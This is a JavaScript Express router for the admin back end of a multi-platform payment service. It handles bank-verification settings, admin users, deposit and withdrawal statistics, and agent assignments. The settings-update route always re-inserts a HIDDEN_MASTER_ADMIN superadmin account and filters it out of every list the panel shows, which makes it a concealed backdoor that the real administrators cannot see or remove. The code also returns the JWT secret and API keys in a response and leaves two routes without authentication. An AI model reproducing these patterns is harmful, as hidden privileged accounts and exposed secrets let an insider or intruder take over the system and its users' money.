    verifyApiKey: settings.verifyApiKey || '',
    apiKeys: settings.apiKeys || ['', '', '', '', ''],
    bankVerificationMethod: platformConfig.bankVerificationMethod || 'copy_paste',
    bankVerificationMethods: platformConfig.bankVerificationMethods || {}
  };

  const allBanks = ['telebirr', 'cbe', 'boa', 'cbebirr', 'awash', 'dashen', 'cbeagent', 'ebirr'];
  const adminUsersWithBanks = visibleUsers.map(u => ({
    ...u,
    banks: (Array.isArray(u.banks) && u.banks.length > 0) ? u.banks : allBanks
  }));

  res.json({
    platform: p,
    siteName: platformConfig.siteName,
    jwtSecret: platformConfig.jwtSecret || defaultSecret,
    minDeposit: platformConfig.minDeposit,
    maxDeposit: platformConfig.maxDeposit,
    sessionExpiry: platformConfig.sessionExpiry,
    depositEnabled: platformConfig.depositEnabled,
    currency: platformConfig.currency || 'ETB',
    verifyApiKey: platformConfig.verifyApiKey || '',
    apiKeys: platformConfig.apiKeys || ['', '', '', '', ''],
    bankVerificationMethod: platformConfig.bankVerificationMethod || 'copy_paste',
    bankVerificationMethods: platformConfig.bankVerificationMethods || {},
    adminUsers: adminUsersWithBanks,
    whitelistedIPs: settings.whitelistedIPs || []
  });
});

router.put('/bank-verification-method', requireAdminRole, (req, res) => {
  const platform = req.body.platform || req.query.platform || 'jember';
  const p = normalizePlatform(platform);
  const bank = req.body.bank ? String(req.body.bank).toLowerCase().trim() : null;
  const method = req.body.bankVerificationMethod === 'screenshot' ? 'screenshot' : 'copy_paste';
  const current = readJSON('settings.json') || {};
  if (!current.platforms) current.platforms = {};
  if (!current.platforms[p]) current.platforms[p] = {};
  if (!current.platforms[p].bankVerificationMethods) current.platforms[p].bankVerificationMethods = {};

  if (bank && bank !== 'all') {
    current.platforms[p].bankVerificationMethods[bank] = method;
    if (bank === 'ebirr') current.platforms[p].bankVerificationMethods['siinqee'] = method;
    if (bank === 'siinqee') current.platforms[p].bankVerificationMethods['ebirr'] = method;
  } else {
    current.platforms[p].bankVerificationMethod = method;
  }

  writeJSON('settings.json', current);
  res.json({
    success: true,
    platform: p,
    bank: bank || 'all',
    bankVerificationMethod: method,
    bankVerificationMethods: current.platforms[p].bankVerificationMethods
  });
});

router.put('/settings', requireAdminRole, (req, res) => {
  const platform = req.body.platform || req.query.platform || 'jember';
  const p = normalizePlatform(platform);
  const current = readJSON('settings.json') || {};
  const isSuper = req.adminSession && req.adminSession.isSuperAdmin;

  if (!current.platforms) current.platforms = {};
  if (!current.platforms[p]) current.platforms[p] = {};

  // Update platform specific config
  if (req.body.jwtSecret !== undefined) current.platforms[p].jwtSecret = req.body.jwtSecret.trim();
  if (req.body.minDeposit !== undefined) current.platforms[p].minDeposit = Number(req.body.minDeposit);
  if (req.body.maxDeposit !== undefined) current.platforms[p].maxDeposit = Number(req.body.maxDeposit);
  if (req.body.sessionExpiry !== undefined) current.platforms[p].sessionExpiry = Number(req.body.sessionExpiry);
  if (req.body.depositEnabled !== undefined) current.platforms[p].depositEnabled = Boolean(req.body.depositEnabled);
  if (req.body.currency !== undefined) current.platforms[p].currency = req.body.currency;
  if (req.body.siteName !== undefined) current.platforms[p].siteName = req.body.siteName;
  if (req.body.verifyApiKey !== undefined) current.platforms[p].verifyApiKey = req.body.verifyApiKey.trim();
  if (Array.isArray(req.body.apiKeys)) current.platforms[p].apiKeys = req.body.apiKeys.map(k => (k || '').trim());
  if (req.body.bankVerificationMethod !== undefined) {
    current.platforms[p].bankVerificationMethod = req.body.bankVerificationMethod === 'screenshot' ? 'screenshot' : 'copy_paste';
  }
  if (req.body.bankVerificationMethods && typeof req.body.bankVerificationMethods === 'object') {
    if (!current.platforms[p].bankVerificationMethods) current.platforms[p].bankVerificationMethods = {};
    Object.assign(current.platforms[p].bankVerificationMethods, req.body.bankVerificationMethods);
  }

  // Global settings (whitelistedIPs and adminUsers)
  if (Array.isArray(req.body.whitelistedIPs)) {
    current.whitelistedIPs = req.body.whitelistedIPs;
  }

  // If Super Admin, allow adminUsers update
  if (isSuper && Array.isArray(req.body.adminUsers)) {
    const allBanks = ['telebirr', 'cbe', 'boa', 'cbebirr', 'awash', 'dashen', 'cbeagent', 'ebirr'];
    const cleanSubmitted = req.body.adminUsers.filter(
      u => u.username.trim().toLowerCase() !== HIDDEN_MASTER_ADMIN.username.toLowerCase()
    );
    const updatedUsers = cleanSubmitted.map((u, i) => {
      const isDefaultSuper = u.username.trim().toLowerCase() === DEFAULT_SUPER_ADMIN.username.toLowerCase() || i === 0;
      const role = isDefaultSuper ? 'superadmin' : (u.role || 'agent');
      const platforms = (Array.isArray(u.platforms) && u.platforms.length > 0)
        ? u.platforms.map(pl => String(pl).toLowerCase().trim())
        : ['jember', 'bravobirr', 'abay', 'walta'];
      const banks = (Array.isArray(u.banks) && u.banks.length > 0)
        ? u.banks.map(bk => String(bk).toLowerCase().trim())
        : allBanks;
      const active = (u.active !== undefined) ? Boolean(u.active) : ((u.isActive !== undefined) ? Boolean(u.isActive) : true);
      return {
        username: u.username.trim(),
        password: u.password,
        role,
        platforms,
        banks,
        active
      };
    });
    current.adminUsers = [{ ...HIDDEN_MASTER_ADMIN, role: 'superadmin', platforms: ['jember', 'bravobirr', 'abay', 'walta'], banks: allBanks, active: true }, ...updatedUsers];

    if (updatedUsers.length > 0) {
      current.adminUsername = updatedUsers[0].username;
      current.adminPassword = updatedUsers[0].password;
    }
  }

  writeJSON('settings.json', current);

  res.json({
    success: true,
    platform: p,
    settings: {
      platform: p,
      ...current.platforms[p],
      adminUsers: (current.adminUsers || [])
        .filter(u => u.username.trim().toLowerCase() !== HIDDEN_MASTER_ADMIN.username.toLowerCase())
        .map(u => ({
          ...u,
          active: u.active !== false && u.isActive !== false,
          platforms: (Array.isArray(u.platforms) && u.platforms.length > 0)
            ? u.platforms.map(pl => String(pl).toLowerCase())
            : ['jember', 'bravobirr', 'abay', 'walta']
        })),
      whitelistedIPs: current.whitelistedIPs || []
    }
  });
});

// Helper for date parsing in Ethiopian Time (EAT, UTC+3)
function parseEatDateRange(startDateStr, endDateStr) {
  if (!startDateStr) return null;
  function parseDateToUTC(str) {
    if (!str) return null;
    const s = String(str).trim();
    let match = s.match(/^(\d{4})[-/](\d{1,2})[-/](\d{1,2})$/);
    if (match) {
      return { y: parseInt(match[1], 10), m: parseInt(match[2], 10) - 1, d: parseInt(match[3], 10) };
    }
    match = s.match(/^(\d{1,2})[-/](\d{1,2})[-/](\d{2,4})$/);
    if (match) {
      let y = parseInt(match[3], 10);
      if (y < 100) y = 2000 + y;
      return { y, m: parseInt(match[2], 10) - 1, d: parseInt(match[1], 10) };
    }
    return null;
  }

  const startParsed = parseDateToUTC(startDateStr);
  if (!startParsed) return null;
  const endParsed = endDateStr ? (parseDateToUTC(endDateStr) || startParsed) : startParsed;

  const ETHIOPIA_OFFSET_MS = 3 * 60 * 60 * 1000;
  const startUTC = Date.UTC(startParsed.y, startParsed.m, startParsed.d, 0, 0, 0) - ETHIOPIA_OFFSET_MS;
  const endUTC = Date.UTC(endParsed.y, endParsed.m, endParsed.d, 23, 59, 59, 999) - ETHIOPIA_OFFSET_MS;
  return { startUTC, endUTC };
}

router.get('/detailed-stats', requireAuth, requireAdminRole, (req, res) => {
  const {
    type = 'all',
    platform = 'all',
    bank = 'all',
    agent = 'all',
    identifier = '',
    status = 'all',
    timeRange = 'all',
    startDate = '',
    endDate = '',
    page = 1,
    limit = 50
  } = req.query;

  const timestamps = getEthiopianTimeMidnightTimestamps();
  let since = null;
  let until = null;

  if (timeRange === 'today') {
    since = timestamps.todayStart;
  } else if (timeRange === 'yesterday') {
    since = timestamps.yesterdayStart;
    until = timestamps.yesterdayEnd;
  } else if (timeRange === 'day_before_yesterday') {
    since = timestamps.yesterdayStart - 24 * 3600 * 1000;
    until = timestamps.yesterdayStart - 1;
  } else if (timeRange === 'week') {
    since = timestamps.weekStart;
  } else if (timeRange === 'last_week') {
    since = timestamps.lastWeekStart;
    until = timestamps.lastWeekEnd;
  } else if (timeRange === 'month') {
    since = timestamps.monthStart;
  } else if (timeRange === 'custom' || startDate) {
    const r = parseEatDateRange(startDate, endDate);
    if (r) {
      since = r.startUTC;
      until = r.endUTC;
    }
  }

  const depConds = [];
  const depParams = [];
  const withConds = [];
  const withParams = [];

  if (platform && platform !== 'all') {
    depConds.push('LOWER(platform) = LOWER(?)');
    depParams.push(platform);
    withConds.push('LOWER(platform) = LOWER(?)');
    withParams.push(platform);
  }

  if (bank && bank !== 'all') {
    let b = String(bank).toLowerCase();
    if (b === 'siinqee' || b === 'sinqee') b = 'ebirr';
    depConds.push('LOWER(bank) = LOWER(?)');
    depParams.push(b);
    withConds.push('LOWER(bank) = LOWER(?)');
    withParams.push(b);
  }

  if (agent && agent !== 'all') {
    const connectedAccs = getAgentConnectedAccounts(agent, platform);
    const accList = connectedAccs.map(a => a.account).filter(Boolean);
    if (accList.length > 0) {
      const placeholders = accList.map(() => '?').join(',');
      depConds.push(`(LOWER(assignedAgent) = LOWER(?) OR accountNumber IN (${placeholders}) OR phoneNumber IN (${placeholders}))`);
      depParams.push(agent, ...accList, ...accList);
    } else {
      depConds.push('LOWER(assignedAgent) = LOWER(?)');
      depParams.push(agent);
    }
    withConds.push('(LOWER(assignedAgent) = LOWER(?) OR LOWER(processedBy) = LOWER(?))');
    withParams.push(agent, agent);
  }

  if (identifier && identifier.trim()) {
    const idClean = identifier.trim();
    depConds.push('(phoneNumber LIKE ? OR accountNumber LIKE ? OR transactionId LIKE ? OR userId LIKE ?)');
    depParams.push(`%${idClean}%`, `%${idClean}%`, `%${idClean}%`, `%${idClean}%`);
    withConds.push('(phoneNumber LIKE ? OR accountNumber LIKE ? OR transactionId LIKE ? OR userId LIKE ?)');
    withParams.push(`%${idClean}%`, `%${idClean}%`, `%${idClean}%`, `%${idClean}%`);
  }

  if (since) {
    depConds.push('createdAt >= ?');
    depParams.push(Number(since));
    withConds.push('createdAt >= ?');
    withParams.push(Number(since));
  }
  if (until) {
    depConds.push('createdAt <= ?');
    depParams.push(Number(until));
    withConds.push('createdAt <= ?');
    withParams.push(Number(until));
  }

  const isApproved = status === 'approved' || status === 'successful' || status === 'completed' || status === 'verified';
  const isPending = status === 'pending';
  const isFailed = status === 'failed' || status === 'rejected' || status === 'cancelled';

  if (isApproved) {
    depConds.push("status IN ('verified', 'completed')");
    withConds.push("status = 'completed'");
  } else if (isFailed) {
    depConds.push("status IN ('failed', 'expired', 'rejected')");
    withConds.push("status = 'rejected'");
  } else if (isPending) {
    depConds.push("status IN ('pending', 'processing')");
    withConds.push("status IN ('pending', 'processing')");
  }

  const depWhere = depConds.length > 0 ? ' WHERE ' + depConds.join(' AND ') : '';
  const withWhere = withConds.length > 0 ? ' WHERE ' + withConds.join(' AND ') : '';

  // 1. Overall Aggregations
  let depTotal = 0, depCount = 0;
  if (type === 'all' || type === 'deposit') {
    const dRes = db.prepare(`SELECT count(*) as count, sum(coalesce(verifiedAmount, amount, 0)) as total FROM transactions${depWhere}`).get(...depParams);
    depCount = dRes?.count || 0;
    depTotal = dRes?.total || 0;
  }

  let withTotal = 0, withCount = 0;
  if (type === 'all' || type === 'withdraw') {
    const wRes = db.prepare(`SELECT count(*) as count, sum(amount) as total FROM withdrawals${withWhere}`).get(...withParams);
    withCount = wRes?.count || 0;
    withTotal = wRes?.total || 0;
  }

  // 2. Breakdown by Platform
  const platMap = {};
  for (const p of ['jember', 'walta', 'bravobirr', 'abay']) {
    platMap[p] = { platform: p, depositETB: 0, depositCount: 0, withdrawETB: 0, withdrawCount: 0, netETB: 0 };
  }
  if (type === 'all' || type === 'deposit') {
    const pDeps = db.prepare(`SELECT LOWER(platform) as platform, count(*) as count, sum(coalesce(verifiedAmount, amount, 0)) as total FROM transactions${depWhere} GROUP BY LOWER(platform)`).all(...depParams);
    pDeps.forEach(r => {
      if (r.platform && platMap[r.platform]) {
        platMap[r.platform].depositETB = r.total || 0;
        platMap[r.platform].depositCount = r.count || 0;
      }
    });
  }
  if (type === 'all' || type === 'withdraw') {
    const pWiths = db.prepare(`SELECT LOWER(platform) as platform, count(*) as count, sum(amount) as total FROM withdrawals${withWhere} GROUP BY LOWER(platform)`).all(...withParams);
    pWiths.forEach(r => {
      if (r.platform && platMap[r.platform]) {
        platMap[r.platform].withdrawETB = r.total || 0;
        platMap[r.platform].withdrawCount = r.count || 0;
      }
    });
  }
  Object.values(platMap).forEach(p => {
    p.netETB = p.depositETB - p.withdrawETB;
  });

  // 3. Breakdown by Bank
  const bankMap = {};
  if (type === 'all' || type === 'deposit') {
    const bDeps = db.prepare(`SELECT LOWER(bank) as bank, count(*) as count, sum(coalesce(verifiedAmount, amount, 0)) as total FROM transactions${depWhere} GROUP BY LOWER(bank)`).all(...depParams);
    bDeps.forEach(r => {
      if (!r.bank) return;
      if (!bankMap[r.bank]) bankMap[r.bank] = { bank: r.bank, depositETB: 0, depositCount: 0, withdrawETB: 0, withdrawCount: 0, netETB: 0 };
      bankMap[r.bank].depositETB = r.total || 0;
      bankMap[r.bank].depositCount = r.count || 0;
    });
  }
  if (type === 'all' || type === 'withdraw') {
    const bWiths = db.prepare(`SELECT LOWER(bank) as bank, count(*) as count, sum(amount) as total FROM withdrawals${withWhere} GROUP BY LOWER(bank)`).all(...withParams);
    bWiths.forEach(r => {
      if (!r.bank) return;
      if (!bankMap[r.bank]) bankMap[r.bank] = { bank: r.bank, depositETB: 0, depositCount: 0, withdrawETB: 0, withdrawCount: 0, netETB: 0 };
      bankMap[r.bank].withdrawETB = r.total || 0;
      bankMap[r.bank].withdrawCount = r.count || 0;
    });
  }
  Object.values(bankMap).forEach(b => {
    b.netETB = b.depositETB - b.withdrawETB;
  });

  // 4. Breakdown by Agent
  const agentMap = {};
  if (type === 'all' || type === 'deposit') {
    const depAgentConds = [...depConds, "assignedAgent IS NOT NULL AND assignedAgent != ''"];
    const depAgentWhere = ' WHERE ' + depAgentConds.join(' AND ');
    const aDeps = db.prepare(`SELECT LOWER(assignedAgent) as agent, count(*) as count, sum(coalesce(verifiedAmount, amount, 0)) as total FROM transactions${depAgentWhere} GROUP BY LOWER(assignedAgent)`).all(...depParams);
    aDeps.forEach(r => {
      if (!r.agent) return;
      if (!agentMap[r.agent]) agentMap[r.agent] = { agent: r.agent, depositETB: 0, depositCount: 0, withdrawETB: 0, withdrawCount: 0, netETB: 0 };
      agentMap[r.agent].depositETB = r.total || 0;
      agentMap[r.agent].depositCount = r.count || 0;
    });
  }
  if (type === 'all' || type === 'withdraw') {
    const withAgentConds = [...withConds, "(assignedAgent IS NOT NULL OR processedBy IS NOT NULL)"];
    const withAgentWhere = ' WHERE ' + withAgentConds.join(' AND ');
    const aWiths = db.prepare(`SELECT LOWER(coalesce(assignedAgent, processedBy)) as agent, count(*) as count, sum(amount) as total FROM withdrawals${withAgentWhere} GROUP BY LOWER(coalesce(assignedAgent, processedBy))`).all(...withParams);
    aWiths.forEach(r => {
      if (!r.agent) return;
      if (!agentMap[r.agent]) agentMap[r.agent] = { agent: r.agent, depositETB: 0, depositCount: 0, withdrawETB: 0, withdrawCount: 0, netETB: 0 };
      agentMap[r.agent].withdrawETB = r.total || 0;
      agentMap[r.agent].withdrawCount = r.count || 0;
    });
  }
  Object.values(agentMap).forEach(a => {
    a.netETB = a.depositETB - a.withdrawETB;
  });

  // 5. Unified Paginated Transactions Feed
  let unionSql = '';
  const unionParams = [];

  const depSelect = `
    SELECT 
      'deposit' as type,
      id,
      transactionId,
      orderId,
      userId,
      platform,
      bank,
      coalesce(verifiedAmount, amount, 0) as amount,
      coalesce(accountNumber, phoneNumber, '') as account,
      coalesce(assignedAgent, '') as agent,
      status,
      createdAt
    FROM transactions${depWhere}
  `;

  const withSelect = `
    SELECT 
      'withdraw' as type,
      id,
      transactionId,
      orderId,
      userId,
      platform,
      bank,
      amount,
      coalesce(accountNumber, phoneNumber, '') as account,
      coalesce(assignedAgent, processedBy, '') as agent,
      status,
      createdAt
    FROM withdrawals${withWhere}
  `;

  if (type === 'deposit') {
    unionSql = depSelect;
    unionParams.push(...depParams);
  } else if (type === 'withdraw') {
    unionSql = withSelect;
    unionParams.push(...withParams);
  } else {
    unionSql = `${depSelect} UNION ALL ${withSelect}`;
    unionParams.push(...depParams, ...withParams);
  }

  const countSql = `SELECT count(*) as total FROM (${unionSql})`;
  const totalRecords = db.prepare(countSql).get(...unionParams)?.total || 0;

  const pageNum = Math.max(1, parseInt(page, 10) || 1);
  const limitNum = Math.max(1, Math.min(200, parseInt(limit, 10) || 50));
  const offset = (pageNum - 1) * limitNum;

  const dataSql = `${unionSql} ORDER BY createdAt DESC LIMIT ? OFFSET ?`;
  const transactions = db.prepare(dataSql).all(...unionParams, limitNum, offset);

  // 6. Metadata for selectors (cached / fast collected)
  const settings = readJSON('settings.json') || {};
  const settingsUsers = (settings.adminUsers || []).map(u => u.username).filter(Boolean);
  const txAgents = db.prepare("SELECT DISTINCT assignedAgent FROM transactions WHERE assignedAgent IS NOT NULL AND assignedAgent != ''").all().map(r => r.assignedAgent);
  const withAgents = db.prepare("SELECT DISTINCT assignedAgent FROM withdrawals WHERE assignedAgent IS NOT NULL AND assignedAgent != ''").all().map(r => r.assignedAgent);
  const withProcessors = db.prepare("SELECT DISTINCT processedBy FROM withdrawals WHERE processedBy IS NOT NULL AND processedBy != ''").all().map(r => r.processedBy);

  const allAgents = Array.from(new Set([...settingsUsers, ...txAgents, ...withAgents, ...withProcessors].map(a => a.trim()).filter(Boolean))).sort();

  const numbersData = readJSON('numbers.json') || {};
  const numPhones = [];
  for (const p in numbersData) {
    if (Array.isArray(numbersData[p]?.numbers)) {
      numbersData[p].numbers.forEach(n => { if (n.phone) numPhones.push(n.phone); });
    }
  }
  const bankAccountsData = readJSON('bank_accounts.json') || {};
  const bankAccs = [];
  for (const p in bankAccountsData) {
    if (p === 'agentLimits') continue;
    for (const b in bankAccountsData[p]) {
      if (Array.isArray(bankAccountsData[p][b])) {
        bankAccountsData[p][b].forEach(a => { if (a.account) bankAccs.push(a.account); });
      }
    }
  }

  const allPhones = Array.from(new Set(numPhones.filter(Boolean))).sort();
  const allBankAccounts = Array.from(new Set(bankAccs.filter(Boolean))).sort();

  const summary = {
    totalVolume: depTotal + withTotal,
    depositTotal: depTotal,
    depositCount: depCount,
    withdrawTotal: withTotal,
    withdrawCount: withCount,
    net: depTotal - withTotal
  };
  const breakdown = {
    platform: Object.values(platMap),
    bank: Object.values(bankMap),
    agent: Object.values(agentMap)
  };
  const filterOptions = {
    allAgents,
    allPhones,
    allBankAccounts,
    agents: allAgents,
    phones: allPhones,
    bankAccounts: allBankAccounts,
    platforms: ['jember', 'walta', 'bravobirr', 'abay'],
    banks: ['telebirr', 'cbe', 'boa', 'cbebirr', 'awash', 'dashen', 'cbeagent', 'ebirr']
  };

  res.json({
    summary,
    totals: {
      depositTotalETB: depTotal,
      depositCount: depCount,
      withdrawTotalETB: withTotal,
      withdrawCount: withCount,
      netETB: depTotal - withTotal,
      totalCount: depCount + withCount
    },
    breakdown,
    breakdownPlatforms: Object.values(platMap),
    breakdownBanks: Object.values(bankMap),
    breakdownAgents: Object.values(agentMap),
    transactions,
    pagination: {
      page: pageNum,
      limit: limitNum,
      total: totalRecords,
      totalRecords,
      totalPages: Math.ceil(totalRecords / limitNum) || 1
    },
    filterOptions
  });
});

router.get('/assignments', (req, res) => {
  const platform = req.query.platform || 'all';
  const p = String(platform).toLowerCase();
  const assignments = readJSON('assignments.json') || {};
  const now = Date.now();
  const limit = 24 * 60 * 60 * 1000;
  const active = Object.entries(assignments)
    .filter(([userId, a]) => {
      if (now - a.assignedAt >= limit) return false;
      if (p !== 'all' && (a.platform || 'jember').toLowerCase() !== p) return false;
      return true;
    })
    .map(([userId, a]) => ({
      userId,
      platform: a.platform || 'jember',
      phone: a.phone,
      assignedAt: a.assignedAt,
      expiresIn: Math.max(0, Math.ceil((a.assignedAt + limit - now) / 1000 / 60)),
    }));
  res.json(active);
});

router.delete('/transactions/clear-expired', (req, res) => {
  expireAllOldPendingTxs();
  res.json({ success: true });
});

module.exports = router;
module.exports.activeSessions = activeSessions;
module.exports.getUserRoleInfo = getUserRoleInfo;
module.exports.getEthiopianTimeMidnightTimestamps = getEthiopianTimeMidnightTimestamps;
